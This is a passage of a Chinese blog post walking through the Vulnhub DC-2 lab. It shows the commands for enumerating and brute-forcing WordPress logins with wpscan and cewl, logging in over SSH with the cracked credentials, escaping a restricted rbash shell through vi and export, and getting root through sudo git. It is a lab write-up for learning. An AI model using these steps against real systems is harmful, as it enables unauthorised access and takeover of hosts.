+<p>由于靶场是WordPress，于是我们就不需要使用cewl去爆破，而使用wpscan一个WordPress的漏洞扫描工具，可以进行用户名枚举。</p>
+<p>原理就是WordPress作者界面的跳转，我们在域名后加入参数<code>?authot=1</code>就可以跳转到序号为1的作者界面，然后跳转的url<code>http://dc-2/index.php/author/admin/</code>的admin默认没有被修改的请况下是和用户名一致的</p>
+<img lazyload src="/assets/images/loading.gif" data-lazy-src="/2026/03/29/vulnhub-DC%E9%80%9A%E5%85%B3/image-20260401083732713.png" class title="image-20260401083732713">
+
+
+
+<p>我们直接枚举用户名</p>
+<div class="code-container" code-lang="Bash"><div class="codebox"><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://dc-2/ -e u</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
+
+<p>扫描到三个用户名</p>
+<img lazyload src="/assets/images/loading.gif" data-lazy-src="/2026/03/29/vulnhub-DC%E9%80%9A%E5%85%B3/image-20260401084102246.png" class title="image-20260401084102246">
+
+
+
+<p>然后使用cewl生成字典</p>
+<div class="code-container" code-lang="Bash"><div class="codebox"><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cewl http://dc-2/ &gt;password.txt</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
+
+
+
+<p>然后再使用wpscan爆破账号密码</p>
+<div class="code-container" code-lang="Bash"><div class="codebox"><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://dc-2/ -U user.txt -P password.txt</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
+
+<p>爆破出tom和jerry的账号密码</p>
+<img lazyload src="/assets/images/loading.gif" data-lazy-src="/2026/03/29/vulnhub-DC%E9%80%9A%E5%85%B3/image-20260401090646778.png" class title="image-20260401090646778">
+
+<p>登录jerry的账号之后我们就可以在page界面看到flag2</p>
+<img lazyload src="/assets/images/loading.gif" data-lazy-src="/2026/03/29/vulnhub-DC%E9%80%9A%E5%85%B3/image-20260401092401562.png" class title="image-20260401092401562">
+
+<p>flag2提示我们</p>
+<div class="code-container" code-lang="Plaintext"><div class="codebox"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">If you can&#x27;t exploit WordPress and take a shortcut, there is another way.</span><br><span class="line">Hope you found another entry point.</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
+
+<p>希望我找到第二个入口点，这个和没提示一样</p>
+<p>然后使用nmap扫描的时候发现了两个端口开放了，然后平时都会开放ssh的22端口没有开放</p>
+<img lazyload src="/assets/images/loading.gif" data-lazy-src="/2026/03/29/vulnhub-DC%E9%80%9A%E5%85%B3/image-20260401094215143.png" class title="image-20260401094215143">
+
+<p>猜测7744端口就是ssh服务</p>
+<p>使用<code>tom/parturient</code>成功登录ssh服务</p>
+<p>在web目录下发现flag3.txt，但是发现cat命令不能使用，可能是访问权限的限制，使用<code>echo $SHELL</code>发现属于rbash限制</p>
+<img lazyload src="/assets/images/loading.gif" data-lazy-src="/2026/03/29/vulnhub-DC%E9%80%9A%E5%85%B3/image-20260401095243392.png" class title="image-20260401095243392">
+
+<p>在rbash下很多行为都是被限制的</p>
+<div class="table-container"><table>
+<thead>
+<tr>
+<th align="left">限制项</th>
+<th align="left">说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">❌ <strong>不能使用 <code>/</code> 执行命令</strong></td>
+<td align="left">无法使用完整路径（如 <code>/bin/cat</code>）</td>
+</tr>
+<tr>
+<td align="left">❌ <strong>不能 <code>cd</code> 切换目录</strong></td>
+<td align="left">无法使用 <code>cd</code> 命令</td>
+</tr>
+<tr>
+<td align="left">❌ <strong>不能修改 <code>PATH</code></strong></td>
+<td align="left"><code>export PATH=...</code> 被禁止</td>
+</tr>
+<tr>
+<td align="left">❌ <strong>不能重定向输出</strong></td>
+<td align="left"><code>&gt;</code> 和 <code>&gt;&gt;</code> 可能被禁止</td>
+</tr>
+<tr>
+<td align="left">❌ <strong>不能执行包含 <code>/</code> 的命令</strong></td>
+<td align="left">如 <code>/usr/bin/vi</code></td>
+</tr>
+</tbody></table></div>
+<p>我们使用<code>compgen -c</code></p>
+<p>命令来寻找可以使用的程序</p>
+<img lazyload src="/assets/images/loading.gif" data-lazy-src="/2026/03/29/vulnhub-DC%E9%80%9A%E5%85%B3/image-20260401095517308.png" class title="image-20260401095517308">
+
+<p>在最后发现一个vi程序，可以使用vi&#x2F;vim文本编辑器打开flag3.txt，拿到flag3</p>
+<div class="code-container" code-lang="Plaintext"><div class="codebox"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes.</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
+
+
+
+<p>除了使用vi编辑查看文本，还有其他方法，也是依赖vi编辑器。通过rbash无法限制vi内部进程的开启，我们可以使用vi去运行<code>/bin/bash</code></p>
+<p>我们尝试输出当前环境变量的Path</p>
+<div class="code-container" code-lang="Bash"><div class="codebox"><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tom@DC-2:~$ <span class="built_in">echo</span> <span class="variable">$PATH</span></span><br><span class="line">/home/tom/usr/bin</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
+
+<p>发现不是在没有常见的一些路径，需要我们添加</p>
+<p>先在vi中的shell变量决定的vi在执行外部命令时使用的shell解释器</p>
+<p>我们先查看vi的shell解释器</p>
+<div class="code-container" code-lang="Bash"><div class="codebox"><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vi </span><br><span class="line">:<span class="built_in">set</span> shell</span><br><span class="line"><span class="comment">#输出</span></span><br><span class="line">shell=/bin/rbash</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
+
+<p>于是我们可以通过修改shell变量来修改vi的shell解释器</p>
+<div class="code-container" code-lang="Bash"><div class="codebox"><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">vi</span><br><span class="line">:<span class="built_in">set</span> shell=/bin/bash <span class="comment">#修改shell变量</span></span><br><span class="line">:<span class="built_in">set</span> shell? <span class="comment">#查看shell变量</span></span><br><span class="line"><span class="comment">#输出</span></span><br><span class="line">shell=/bin/bash</span><br><span class="line"><span class="comment">#最后启动/bin/bash 但是我没有成功</span></span><br><span class="line">:shell </span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
+
+
+
+<p>虽然上面没有成功，但是我们还有方法，发现我们被限制的主要原因是<code>$PATH=/home/tom/usr/bin</code>让我们没有足够的命令，还有<code>$SHELL=/bin/rbash</code>让我们命令执行被限制</p>
+<p>但是export命令可以执行，我们可以通过export命令修改环境变量</p>
+<div class="code-container" code-lang="Bash"><div class="codebox"><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> PATH=/bin:/usr/bin:<span class="variable">$PATH</span></span><br><span class="line"><span class="built_in">export</span> SHELL=/bin/bash</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
+
+<p>然后就可以使用命令了</p>
+<img lazyload src="/assets/images/loading.gif" data-lazy-src="/2026/03/29/vulnhub-DC%E9%80%9A%E5%85%B3/image-20260401105435787.png" class title="image-20260401105435787">
+
+
+
+<p>拿到flag3之后提示我们去jerry那里找一下在<code>/home/jerry/flag4.txt</code></p>
+<p>没有权限限制，我们直接按照flag3的方式去读取即可，使用vi或者export绕过rbash</p>
+<img lazyload src="/assets/images/loading.gif" data-lazy-src="/2026/03/29/vulnhub-DC%E9%80%9A%E5%85%B3/image-20260401110131436.png" class title="image-20260401110131436">
+
+<p>可以执行命令后尝试使用find去查找最后的flag，但是发现权限不够</p>
+<img lazyload src="/assets/images/loading.gif" data-lazy-src="/2026/03/29/vulnhub-DC%E9%80%9A%E5%85%B3/image-20260401110446401.png" class title="image-20260401110446401">
+
+<p>结合flag4，我们需要使用git提权</p>
+<p>tom不能用sudo git执行，我们先转为jerry<code>su jerry</code>，密码就是WordPress爆出来的密码</p>
+<p>然后<code>sudo -l</code>查看可以用sudo执行的命令</p>
+<div class="code-container" code-lang="Bash"><div class="codebox"><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">jerry@DC-2:/home/tom$ <span class="built_in">sudo</span> -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> jerry on DC-2:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User jerry may run the following commands on DC-2:</span><br><span class="line">    (root) NOPASSWD: /usr/bin/git</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
+
+<p>然后进行提权</p>
+<div class="code-container" code-lang="Bash"><div class="codebox"><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> git <span class="built_in">help</span> config</span><br><span class="line">!/bin/bash 或 !<span class="string">&#x27;sh&#x27;</span> <span class="comment">#进入git后输入</span></span><br><span class="line"><span class="comment"># 或者</span></span><br><span class="line"><span class="built_in">sudo</span> git -p <span class="built_in">help</span> </span><br><span class="line">!/bin/bash <span class="comment">#输入!/bin/bash 即可打开一个用户为root的shell</span></span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
+
+<p>成功拿到root权限</p>
+<img lazyload src="/assets/images/loading.gif" data-lazy-src="/2026/03/29/vulnhub-DC%E9%80%9A%E5%85%B3/image-20260401112506220.png" class title="image-20260401112506220">
+
+<p>继续find找flag，找到在<code>/root/final-flag.txt</code>中，直接读取</p>
+<img lazyload src="/assets/images/loading.gif" data-lazy-src="/2026/03/29/vulnhub-DC%E9%80%9A%E5%85%B3/image-20260401113235762.png" class title="image-20260401113235762">
+
+
+
+</div><div class="post-reward"><div class="post-reward-btn" title="赞赏作者"><img src="/assets/images/svg/uc/uc-gift.svg" class="icon noview" alt="Icon"><span></span></div><div class="post-reward-content"><div class="post-reward-text"></div><div class="post-reward-list"><a href="/null" target="_blank">致谢名单</a></div></div></div><div class="post-copyright"><div class="post-copyright-info">本作品由 Regulus 于 2026-03-29 15:34:36 发布</div><div class="post-copyright-link"><span>作品地址：<a href="http://example.com/2026/03/29/vulnhub-DC%E9%80%9A%E5%85%B3/">vulnhub_DC通关</a></span><button class="copy-text" type="button" data-text="http://example.com/2026/03/29/vulnhub-DC%E9%80%9A%E5%85%B3/">复制</button></div><div class="post-copyright-detail">除特别声明外，本站作品均采用 <a href='https://creativecommons.org/licenses/by-nc-sa/4.0/' title='Attribution-NonCommercial-ShareAlike' target='_blank'>CC BY-NC-SA 4.0</a> 许可协议，转载请注明来自 <a href='/'>Mei的小窝</a></div><img class="post-copyright-icon noview" src="/assets/images/Hexo-Theme-MEOW.png" alt="Logo"/></div><div class="post-tail-tags"><a class="post-tail-tags-link" href="/tags/Vulnhub/" rel="tag">Vulnhub</a><a class="post-tail-tags-link" href="/tags/%E6%B8%97%E9%80%8F/" rel="tag">渗透</a></div></div><aside id="post-sidebar" status="show"><div id="toc-container"><div class="toc-title"><img src="/assets/images/svg/ta/ta-toc.svg" class="icon noview" alt="Icon"><span>目录</span></div><div class="toc-content" id="toc-div"><ol class="toc-list"><li class="toc-list-item toc-list-level-1"><a class="toc-list-link" href="#vulnhub-DC%E9%80%9A%E5%85%B3"><span class="toc-list-text">vulnhub_DC通关</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#DC-1"><span class="toc-list-text">DC-1</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#DC-2"><span class="toc-list-text">DC-2</span></a></li></ol></li></ol></div></div></aside></div></div><div id="toolbar" hide=""><div id="toolbar-setting-container" hide=""><div class="toolbar-item"><button id="tool-color-mode" title="深色模式" type="button"><img src="/assets/images/svg/ta/ta-moon.svg" class="icon noview" alt="Icon"></button></div><div class="toolbar-item"><button class="copy-text" id="tool-share" title="分享" type="button" data-text="http://example.com/2026/03/29/vulnhub-DC%E9%80%9A%E5%85%B3/"><img src="/assets/images/svg/ta/ta-share.svg" class="icon noview" alt="Icon"></button></div><div class="toolbar-item"><button id="tool-font-size-plus" title="放大字体" type="button"><img src="/assets/images/svg/ta/ta-text-plus.svg" class="icon noview" alt="Icon"></button></div><div class="toolbar-item"><button id="tool-font-size-minus" title="缩小字体" type="button"><img src="/assets/images/svg/ta/ta-text-minus.svg" class="icon noview" alt="Icon"></button></div></div><div class="toolbar-container"><div class="toolbar-item"><button id="tool-setting" title="设置" type="button"><img src="/assets/images/svg/ta/ta-setting.svg" class="icon noview" alt="Icon"></button></div><div class="toolbar-item"><button id="tool-toc" title="目录" type="button"><img src="/assets/images/svg/ta/ta-toc.svg" class="icon noview" alt="Icon"></button></div><div class="toolbar-item"><button id="tool-gototop" title="返回顶部" type="button"><img src="/assets/images/svg/ta/ta-up.svg" class="icon noview" alt="Icon"></button></div></div></div><div class="search-overlay"><div class="search-container"><div class="search-header"><div class="search-title"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M10 10m-7 0a7 7 0 1 0 14 0a7 7 0 1 0 -14 0" /><path d="M21 21l-6 -6" /></svg>
+搜索</div><div class="search-close-btn"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M12 21a9 9 0 0 0 9 -9a9 9 0 0 0 -9 -9a9 9 0 0 0 -9 9a9 9 0 0 0 9 9z" /><path d="M9 8l6 8" /><path d="M15 8l-6 8" /></svg></div></div><div class="search-input-box"><input id="search-input" type="search" placeholder="请输入关键词进行站内搜索……" value="" maxlength="80"/></div><div class="search-result-container"><div class="search-result-icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M10 10m-7 0a7 7 0 1 0 14 0a7 7 0 1 0 -14 0" /><path d="M21 21l-6 -6" /></svg></div></div></div></div></main><footer><div class="footer"><div id="footer-copyright">© 2024 - 2026 <span>💗</span> <a href="/null">Regulus</a></div><div id="footer-info"><div id="footer-framework">🚀本站由 <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/chanwj/hexo-theme-meow" title="3.2.0" target="_blank">Meow</a> 强力驱动</div><div id="footer-runtime"><span id="runtime" data-startdate="2024-04-02T22:16:20.000Z">🌻已稳定运行.年.月.天</span></div></div><div id="footer-statistic"><span>共撰写187篇文章，全站共511.6k字</span></div><div id="footer-pageview"><div id="container_site_pv"><span>🔥总访问量</span><span id="vercount_value_site_pv"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none"  stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M12 6l0 -3" /><path d="M16.25 7.75l2.15 -2.15" /><path d="M18 12l3 0" /><path d="M16.25 16.25l2.15 2.15" /><path d="M12 18l0 3" /><path d="M7.75 16.25l-2.15 2.15" /><path d="M6 12l-3 0" /><path d="M7.75 7.75l-2.15 -2.15" /></svg></span></div><div id="container_site_uv"><span>🐈访客人数</span><span id="vercount_value_site_uv"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none"  stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M12 6l0 -3" /><path d="M16.25 7.75l2.15 -2.15" /><path d="M18 12l3 0" /><path d="M16.25 16.25l2.15 2.15" /><path d="M12 18l0 3" /><path d="M7.75 16.25l-2.15 2.15" /><path d="M6 12l-3 0" /><path d="M7.75 7.75l-2.15 -2.15" /></svg></span></div></div></div></footer><div class="scripts"><script>const GLOBALCONFIG = {
+  root: '/',
+  toolbar: true,
+  lazyload_src: '/assets/images/loading.gif',
+  friends: false,
+  codeblock: true,
+  share_text: '',
+  onblur_title: 'Please Come Back～✧(´▽`ʃ♡ƪ)',
+  mouse_click: false,
+  notify:{
+    enable: false,
+    info: '复制成功～转载请标注本文地址',
+    f12_info: '开发者模式已打开，请遵循本站版权协议'
+  },
+  search: {
+    enable: true,
+    path: 'search.json',
+    local: {
+      top_n_per_article: 1,
+      preload: false
+    }
+  },
+  encrypt: false,
+};
+</script><script>if (!localStorage.getItem('color-mode')) {
+  localStorage.setItem('color-mode', 'light' || 'light');
+}
+document.body.setAttribute('data-mode', localStorage.getItem('color-mode'));
+</script>
+<script src="/js/theme/tools/utils.js"></script>
+
+<script src="/js/plugins/dist/lazyload.min.js"></script>
+
+<script src="/js/plugins/view-image.min.js"></script>
+<script src="https://events.vercount.one/js" defer="defer"></script><script>if (localStorage.getItem('font-size')) {
+  document.querySelector('.post').style.fontSize = localStorage.getItem('font-size') + 'px';
+}
+</script>
+<script src="/js/plugins/dist/search.js"></script>
+
+<script src="/js/main.js" type="module"></script>
+</div></body></html>
